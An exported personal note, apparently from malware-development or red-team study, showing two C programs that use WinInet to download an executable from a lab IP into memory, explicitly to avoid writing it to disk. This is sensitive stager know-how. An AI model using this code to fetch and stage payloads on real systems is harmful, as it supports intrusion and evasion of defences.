<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>WinInet</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Downloader - WinInet</h1></strong><br />Use the <code>WinInet</code> functions to manually open session, create request, download file, etc.<br /><a href="https://docs.microsoft.com/en-gb/windows/win32/wininet/http-sessions?redirectedfrom=MSDN#Downloading_resource">https://docs.microsoft.com/en-gb/windows/win32/wininet/http-sessions?redirectedfrom=MSDN#Downloading_resource</a><br /><br />Can&#39;t use <code>URLDownloadToFile</code> because that downloads to disk.<br />Instead, we do basically all of what URLDownloadToFile does except we can keep the file in memory rather than writing to disk.<br /><br /><strong><h2>## InternetOpenUrl</h2></strong><br />Easy way. Don&#39;t have to create the HTTP request yourself.<br /><br />• <a href="https://stackoverflow.com/questions/47486240/downloading-data-via-wininet">https://stackoverflow.com/questions/47486240/downloading-data-via-wininet</a><br /><br />1. <code>InternetOpenA</code> - initialise WinInet<br />2. <code>InternetOpenURLA</code> - open URL<br />3. <code>InternetReadFile</code> - download file <br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br />#include&nbsp;&lt;WinInet.h&gt;<br /><br />#pragma&nbsp;comment(lib,&nbsp;&quot;Wininet.lib&quot;)<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />	BOOL&nbsp;bRet&nbsp;=&nbsp;FALSE;<br /><br />	char&nbsp;url[]&nbsp;=&nbsp;&quot;http://192.168.58.142/whoami.exe&quot;;<br />	char&nbsp;user_agent[]&nbsp;=&nbsp;&quot;hey&nbsp;:)&quot;;<br /><br />	//&nbsp;initialise&nbsp;WinInet<br />	HANDLE&nbsp;hInternet&nbsp;=&nbsp;NULL;<br />	hInternet&nbsp;=&nbsp;InternetOpenA(user_agent,&nbsp;INTERNET_OPEN_TYPE_PRECONFIG,&nbsp;NULL,&nbsp;NULL,&nbsp;0);<br />	if&nbsp;(hInternet&nbsp;==&nbsp;NULL)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;faile&nbsp;to&nbsp;initialise&nbsp;WinINet:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[+]&nbsp;initailised&nbsp;WinInet&nbsp;\n&quot;);<br /><br />	//&nbsp;open&nbsp;URL<br />	HANDLE&nbsp;hUrl&nbsp;=&nbsp;NULL;<br />	hUrl&nbsp;=&nbsp;InternetOpenUrlA(hInternet,&nbsp;url,&nbsp;NULL,&nbsp;0,&nbsp;0,&nbsp;0);<br />	if&nbsp;(hUrl&nbsp;==&nbsp;FALSE)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;failed&nbsp;to&nbsp;open&nbsp;URL:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[i]&nbsp;opened&nbsp;URL&nbsp;\n&quot;);<br /><br />	//&nbsp;download&nbsp;file<br />	//&nbsp;The&nbsp;proper&nbsp;way&nbsp;to&nbsp;is&nbsp;to&nbsp;loop&nbsp;in&nbsp;chunks&nbsp;and&nbsp;download&nbsp;until&nbsp;bytes&nbsp;read&nbsp;==&nbsp;0.&nbsp;That&nbsp;way&nbsp;you&nbsp;verify&nbsp;you&#39;ve&nbsp;downloaded&nbsp;the&nbsp;whole&nbsp;file.<br />	char&nbsp;file_buffer[66560];<br />	DWORD&nbsp;dwBytesRead&nbsp;=&nbsp;0;<br /><br />	bRet&nbsp;=&nbsp;InternetReadFile(hUrl,&nbsp;file_buffer,&nbsp;sizeof(file_buffer),&nbsp;&amp;dwBytesRead);<br />	if&nbsp;(bRet&nbsp;==&nbsp;FALSE)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;failed&nbsp;to&nbsp;download&nbsp;file:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br /><br />	printf(&quot;[+]&nbsp;file&nbsp;downloaded.&nbsp;bytes&nbsp;downloaded:&nbsp;%d&nbsp;\n&quot;,&nbsp;dwBytesRead);<br />	<br />	/*<br />	HANDLE&nbsp;hFile&nbsp;=&nbsp;CreateFileW(L&quot;whoami.exe&quot;,&nbsp;GENERIC_READ&nbsp;|&nbsp;GENERIC_WRITE,&nbsp;0,&nbsp;NULL,&nbsp;CREATE_ALWAYS,&nbsp;FILE_ATTRIBUTE_NORMAL,&nbsp;NULL);<br />	WriteFile(hFile,&nbsp;&amp;file_buffer,&nbsp;sizeof(file_buffer),&nbsp;NULL,&nbsp;NULL);<br />	CloseHandle(hFile);*/<br /><br />	InternetCloseHandle(hInternet);<br />	InternetCloseHandle(hUrl);<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong><h2>## InternetConnect -&gt; HttpOpenRequest -&gt; HttpSendRequest</h2></strong><br />You create the HTTP request this way.<br />Allows more custoisation? Don&#39;t really know.<br /><br />Media types:<br />• PE - <code>application/vnd.microsoft.portable-executable</code><br />• General bytes - <code>application/octet-stream</code><br /><br />1. <code>InternetOpenA</code><br />2. <code>InternetConnectA</code><br />3. <code>HttpOpenRequestA</code><br />4. <code>HttpSendRequestA</code><br />5. <code>InternetReadFile</code><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br />#include&nbsp;&lt;WinInet.h&gt;<br /><br />#pragma&nbsp;comment(lib,&nbsp;&quot;Wininet.lib&quot;)<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />	BOOL&nbsp;bRet&nbsp;=&nbsp;FALSE;<br />	<br />	char&nbsp;ip[]&nbsp;=&nbsp;&quot;192.168.58.142&quot;;<br />	char&nbsp;object_name[]&nbsp;=&nbsp;&quot;whoami.exe&quot;;<br />	char&nbsp;user_agent[]&nbsp;=&nbsp;&quot;hey&nbsp;:)&quot;;<br />	LPCSTR&nbsp;media_types[]&nbsp;=&nbsp;{&nbsp;&quot;application/octet-stream&quot;,&nbsp;NULL&nbsp;};<br />	<br />	//&nbsp;initialise&nbsp;WinInet<br />	HANDLE&nbsp;hInternet&nbsp;=&nbsp;NULL;<br />	hInternet&nbsp;=&nbsp;InternetOpenA(user_agent,&nbsp;INTERNET_OPEN_TYPE_PRECONFIG,&nbsp;NULL,&nbsp;NULL,&nbsp;0);<br />	if&nbsp;(hInternet&nbsp;==&nbsp;NULL)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;faile&nbsp;to&nbsp;initialise&nbsp;WinINet:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[+]&nbsp;initailised&nbsp;WinInet&nbsp;\n&quot;);<br />	<br />	//&nbsp;create&nbsp;HTTP&nbsp;session<br />	HANDLE&nbsp;hConnect&nbsp;=&nbsp;NULL;<br />	hConnect&nbsp;=&nbsp;InternetConnectA(hInternet,&nbsp;ip,&nbsp;INTERNET_DEFAULT_HTTP_PORT,&nbsp;NULL,&nbsp;NULL,&nbsp;INTERNET_SERVICE_HTTP,&nbsp;0,&nbsp;0);<br />	if&nbsp;(hConnect&nbsp;==&nbsp;NULL)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;failed&nbsp;to&nbsp;open&nbsp;a&nbsp;HTTP&nbsp;session:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[+]&nbsp;created&nbsp;HTTP&nbsp;session&nbsp;\n&quot;);<br /><br />	//&nbsp;create&nbsp;HTTP&nbsp;request<br />	HANDLE&nbsp;hRequest&nbsp;=&nbsp;NULL;<br />	hRequest&nbsp;=&nbsp;HttpOpenRequestA(hConnect,&nbsp;&quot;GET&quot;,&nbsp;object_name,&nbsp;NULL,&nbsp;NULL,&nbsp;media_types,&nbsp;0,&nbsp;0);<br />	if&nbsp;(hRequest&nbsp;==&nbsp;NULL)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;failed&nbsp;to&nbsp;create&nbsp;HTTP&nbsp;request&nbsp;handle:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[+]&nbsp;created&nbsp;HTTP&nbsp;request&nbsp;handle&nbsp;\n&quot;);<br /><br />	//&nbsp;send&nbsp;HTTP&nbsp;request<br />	bRet&nbsp;=&nbsp;HttpSendRequestA(hRequest,&nbsp;NULL,&nbsp;0,&nbsp;NULL,&nbsp;0);<br />	if&nbsp;(bRet&nbsp;==&nbsp;FALSE)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;failed&nbsp;to&nbsp;send&nbsp;http&nbsp;request:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[+]&nbsp;sent&nbsp;http&nbsp;request&nbsp;\n&quot;);<br /><br />	//&nbsp;download&nbsp;file<br />	//&nbsp;Proper&nbsp;way&nbsp;is&nbsp;to&nbsp;loop&nbsp;until&nbsp;dwBytesRead&nbsp;=&nbsp;0.&nbsp;That&nbsp;way&nbsp;you&nbsp;verify&nbsp;you&#39;ve&nbsp;downloaded&nbsp;the&nbsp;whole&nbsp;file.<br />	char&nbsp;file_buffer[66560];<br />	DWORD&nbsp;dwBytesRead&nbsp;=&nbsp;0;<br />	bRet&nbsp;=&nbsp;InternetReadFile(hRequest,&nbsp;file_buffer,&nbsp;sizeof(file_buffer),&nbsp;&amp;dwBytesRead);<br />	if&nbsp;(bRet&nbsp;==&nbsp;FALSE)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;failed&nbsp;to&nbsp;download&nbsp;file:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[+]&nbsp;file&nbsp;downloaded.&nbsp;bytes&nbsp;downlaoded:&nbsp;%d&nbsp;\n&quot;,&nbsp;dwBytesRead);<br />	<br />	InternetCloseHandle(hInternet);<br /><br />	HANDLE&nbsp;hFile&nbsp;=&nbsp;CreateFileW(L&quot;whoami.exe&quot;,&nbsp;GENERIC_READ&nbsp;|&nbsp;GENERIC_WRITE,&nbsp;0,&nbsp;NULL,&nbsp;CREATE_ALWAYS,&nbsp;FILE_ATTRIBUTE_NORMAL,&nbsp;NULL);<br />	WriteFile(hFile,&nbsp;&amp;file_buffer,&nbsp;dwBytesRead,&nbsp;NULL,&nbsp;NULL);<br />	CloseHandle(hFile);<br />	<br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong><h2>## Other functions</h2></strong><br /><code>InternetSetCookieA</code> - create cookie assosciated with URL<br /><code>InternetCrackUrlA</code> - to break URL up into parts<br /><code>InternetOpenA</code> - initialise use of WinInet functions<br /><code>InternetConnectA</code> - Open HTTP session<br /><code>HttpOpenRequest</code> - Create HTTP request<br /><code>HttpSendRequest</code> - Send HTTP request<br /><code>HttpQueryInfo</code> - Retrieve header info of HTTP request<br /><code>InternetReadFile</code> - Read recieved data into buffer<br /><code>InternetCloseHandle</code> - Close connection<br /></div>
</body>
</html>
